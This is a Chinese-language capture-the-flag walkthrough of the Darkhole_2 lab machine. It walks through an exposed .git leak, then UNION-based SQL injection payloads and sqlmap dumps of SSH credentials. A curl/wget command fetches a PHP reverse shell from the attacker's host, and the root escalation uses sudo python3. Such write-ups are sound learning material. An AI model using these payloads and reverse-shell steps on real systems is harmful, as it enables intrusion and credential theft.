## 0x001 前言

大家快来看，我成功研究出来了Darkhole_2整个最新靶机的全过程

希望大家来观看，他是一个基于sql注入和系统提权的全过程，作者将他标记位hard，请大家观看我的操作

## 0x002操作过程

首先进行ip扫描

![](https://image.3001.net/images/20210907/1630996633_61370899de234b8d24d7e.png!small)于是我对这个ip进行协议扫描

> nmap -sC -sV 192.168.181.161 -p- -v --min-rate=2000

![1630997097_61370a692a593ef423664.png!small?1630997099197](https://image.3001.net/images/20210907/1630997097_61370a692a593ef423664.png!small?1630997099197)

由于打开80端口，于是我打开网页进行查看  
![1630997146_61370a9af2f37a4876213.png!small?1630997156708](https://image.3001.net/images/20210907/1630997146_61370a9af2f37a4876213.png!small?1630997156708)由于我在端口协议扫描的时候，我发现一个目录192.168.181.161:80/.git/，于是打开进行查看

![1630997347_61370b630a477949754cc.png!small?1630997349062](https://image.3001.net/images/20210907/1630997347_61370b630a477949754cc.png!small?1630997349062)

由于一些文件无法查看，于是我将其下载到kali本地

> wget -r 192.168.181.161:80/.git/

![1631017701_61375ae55659e2027e92d.png!small?1631017701892](https://image.3001.net/images/20210907/1631017701_61375ae55659e2027e92d.png!small?1631017701892)

下载完毕，于是进行查看，我们可以看到网页的源码

![1631017756_61375b1cf0b210199811f.png!small?1631017757745](https://image.3001.net/images/20210907/1631017756_61375b1cf0b210199811f.png!small?1631017757745)

由于我们已经有了git库

![1631017878_61375b96215525b04ef45.png!small?1631017878823](https://image.3001.net/images/20210907/1631017878_61375b96215525b04ef45.png!small?1631017878823)

于是我使用git clone . webapp，来进行复制

![1631017977_61375bf96f6cf63da4af6.png!small?1631017978113](https://image.3001.net/images/20210907/1631017977_61375bf96f6cf63da4af6.png!small?1631017978113)

于是我在login.php的文件中看见了，用户登录的逻辑

![1631017998_61375c0eaed739ddd26cf.png!small?1631017999409](https://image.3001.net/images/20210907/1631017998_61375c0eaed739ddd26cf.png!small?1631017999409)

正如我们上面看到的，对于sql语句的输入都有一些过滤，于是我们无法进行sql注入，于是在.git文件下，看到了一些证据

> git log

![1631018030_61375c2ed2f4fa4d89cd5.png!small?1631018031687](https://image.3001.net/images/20210907/1631018030_61375c2ed2f4fa4d89cd5.png!small?1631018031687)

我们在git日志中，看到了第二次提交的依据，要将HEAD切换到master

> git checkout a4d9
>
> cat login.php

![1631018060_61375c4cb0e0feefb05bd.png!small?1631018061342](https://image.3001.net/images/20210907/1631018060_61375c4cb0e0feefb05bd.png!small?1631018061342)

于是我们知道了登录的用户名和密码，于是到login.php进行登录

![1631018088_61375c686df2d8d3ff292.png!small?1631018089205](https://image.3001.net/images/20210907/1631018088_61375c686df2d8d3ff292.png!small?1631018089205)

登录成功，由于上文中login.php的文件中登录成功后，就会执行sql语句，于是我尝试进行sql注入，又两种方法可以注入，一是通过手工注入和sqlmap进行注入

一、手工注入

现在id后输入Null

![1631018224_61375cf0541ee4659212f.png!small?1631018225183](https://image.3001.net/images/20210907/1631018224_61375cf0541ee4659212f.png!small?1631018225183)

于是我在Null后加‘，于是我猜测数据库中至少有5列

![1631018304_61375d405f959628dfdb1.png!small?1631018305292](https://image.3001.net/images/20210907/1631018304_61375d405f959628dfdb1.png!small?1631018305292)

于是进行猜测数据库中有几列，使用order by

> 1' ORDER BY 6 -- -（有反应）

![1631018368_61375d80a048a9751ffa4.png!small?1631018369332](https://image.3001.net/images/20210907/1631018368_61375d80a048a9751ffa4.png!small?1631018369332)

1' ORDER BY 7 -- - （无反应）

![1631018395_61375d9be054b4c8abd70.png!small?1631018396492](https://image.3001.net/images/20210907/1631018395_61375d9be054b4c8abd70.png!small?1631018396492)

于是查看回显位是哪个

>  
>
>
> id=NULL' UNION ALL SELECT 1,2,3,4,5,6 -- -
![1631018462_61375dde646d1d64cbc00.png!small?1631018463085](https://image.3001.net/images/20210907/1631018462_61375dde646d1d64cbc00.png!small?1631018463085)

于是发现2，3，5，6是回显位，于是进行数据库爆破

> id=NULL' UNION ALL SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6 FROM
> information_schema.schemata -- -
![1631018533_61375e259c8c2eeac7747.png!small?1631018534176](https://image.3001.net/images/20210907/1631018533_61375e259c8c2eeac7747.png!small?1631018534176)

查看数据中的表

> NULL' UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM
> information_schema.tables WHERE table_schema='darkhole_2'-- -
![1631018590_61375e5e60a156a492495.png!small?1631018591043](https://image.3001.net/images/20210907/1631018590_61375e5e60a156a492495.png!small?1631018591043)

查看数据库中的所有列名

> NULL' UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6 FROM
> information_schema.columns WHERE table_name='ssh'-- -
![1631018730_61375eead260ec42732d6.png!small?1631018731451](https://image.3001.net/images/20210907/1631018730_61375eead260ec42732d6.png!small?1631018731451)

于是获取数据的用户名和密码

![1631018801_61375f317ec3ed5a44a8d.png!small?1631018802066](https://image.3001.net/images/20210907/1631018801_61375f317ec3ed5a44a8d.png!small?1631018802066)

可以进行ssh登录

二、sqlmap破解

首先进行抓包获取cookie

![1631018856_61375f68d76fa56ac6ef1.png!small?1631018857453](https://image.3001.net/images/20210907/1631018856_61375f68d76fa56ac6ef1.png!small?1631018857453)

于是进行sqlmap爆破数据库

>  
>
>
> sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie
> PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu --current-db

![1631018961_61375fd16f39baf9bcc57.png!small?1631018962139](https://image.3001.net/images/20210907/1631018961_61375fd16f39baf9bcc57.png!small?1631018962139)

进行数据库表名爆破

  

> sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie
> PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu -D darkhole_2 --tables

![1631019013_6137600531cc60564c99e.png!small?1631019013846](https://image.3001.net/images/20210907/1631019013_6137600531cc60564c99e.png!small?1631019013846)

进行数据库用户名密码爆破

> sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie
> PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu -D darkhole_2 -T ssh -dump

![1631019049_61376029bf724fe74a302.png!small](https://image.3001.net/images/20210907/1631019049_61376029bf724fe74a302.png!small)

于是进行ssh登录

> ssh [jehad@192.168.181.161](http://192.168.181.161)

![1631019135_6137607fdf1ce27dffe38.png!small?1631019136477](https://image.3001.net/images/20210907/1631019135_6137607fdf1ce27dffe38.png!small?1631019136477)

进行提权

> cat .bash_history

在查看历史记录时，发现提权方法

![1631019267_61376103c066114ca4308.png!small?1631019268389](https://image.3001.net/images/20210907/1631019267_61376103c066114ca4308.png!small?1631019268389)

于是我到/opt/web下发现一个index.php的文件

![1631019285_61376115ecb7252e2aab8.png!small?1631019286543](https://image.3001.net/images/20210907/1631019285_61376115ecb7252e2aab8.png!small?1631019286543)

我又在/etc/crontab 下发现一个用户

![1631019329_6137614106c9a326bddb0.png!small?1631019329568](https://image.3001.net/images/20210907/1631019329_6137614106c9a326bddb0.png!small?1631019329568)

发现cmd是可以运行的，于是使用连接远程端口

> ssh -L 9999:127.0.0.1:9999 jehad@192.168.181.161

查看端口是否已经打开

![1631019463_613761c7ec9546a562e22.png!small?1631019464638](https://image.3001.net/images/20210907/1631019463_613761c7ec9546a562e22.png!small?1631019464638)

9999端口已经打开，于是查看id

> curl "http://127.0.0.1:9999/?cmd=id"

![1631019511_613761f76a9c51022f839.png!small?1631019512480](https://image.3001.net/images/20210907/1631019511_613761f76a9c51022f839.png!small?1631019512480)

于是上传shell，进行反弹，首先在kali开启http端口

![1631019573_61376235c1229dbaadc81.png!small?1631019574427](https://image.3001.net/images/20210907/1631019573_61376235c1229dbaadc81.png!small?1631019574427)

于是下载到靶机，上传shell

> curl "http://127.0.0.1:9999/?cmd=wget%20192.168.181.129:6666/11.php"

![1631019608_61376258c9ac1d5669043.png!small?1631019609354](https://image.3001.net/images/20210907/1631019608_61376258c9ac1d5669043.png!small?1631019609354)

11.php就是我们经常使用php-reverse-shell.php，于是运行shell，并进行监听

![1631019628_6137626cc1a972f8926be.png!small?1631019629313](https://image.3001.net/images/20210907/1631019628_6137626cc1a972f8926be.png!small?1631019629313)

运行shell命令

> curl "http://127.0.0.1:9999/11.php"

![1631019658_6137628a845c0e12a0bdd.png!small?1631019659302](https://image.3001.net/images/20210907/1631019658_6137628a845c0e12a0bdd.png!small?1631019659302)

于是发现第一个flag

![1631019683_613762a30b57ed96873e5.png!small?1631019683604](https://image.3001.net/images/20210907/1631019683_613762a30b57ed96873e5.png!small?1631019683604)

我又在历史文件里发现了密码

> cat .bash_history

![1631019716_613762c4a1fd5ee90b45f.png!small?1631019717207](https://image.3001.net/images/20210907/1631019716_613762c4a1fd5ee90b45f.png!small?1631019717207)

于是进行ssh登录

> ssh losy@192.168.181.161

![1631019740_613762dc405677114a22a.png!small?1631019740973](https://image.3001.net/images/20210907/1631019740_613762dc405677114a22a.png!small?1631019740973)

于是进行提权

> sudo -l

![1631019880_613763682c7c7592274aa.png!small?1631019880735](https://image.3001.net/images/20210907/1631019880_613763682c7c7592274aa.png!small?1631019880735)

> sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

![1631019901_6137637dd9cd197b271cd.png!small?1631019902518](https://image.3001.net/images/20210907/1631019901_6137637dd9cd197b271cd.png!small?1631019902518)

于是获得root权限

![1631019922_613763927bc3b49fd5c79.png!small?1631019923068](https://image.3001.net/images/20210907/1631019922_613763927bc3b49fd5c79.png!small?1631019923068)

于是获得最终flag

![1631019940_613763a4eebe03bdab5c4.png!small?1631019941481](https://image.3001.net/images/20210907/1631019940_613763a4eebe03bdab5c4.png!small?1631019941481)

  

## 0x003 总结

我通过靶机学会了新的sql注入的方法，以及通过开启本地端口来执行命令；谢谢大家观看！

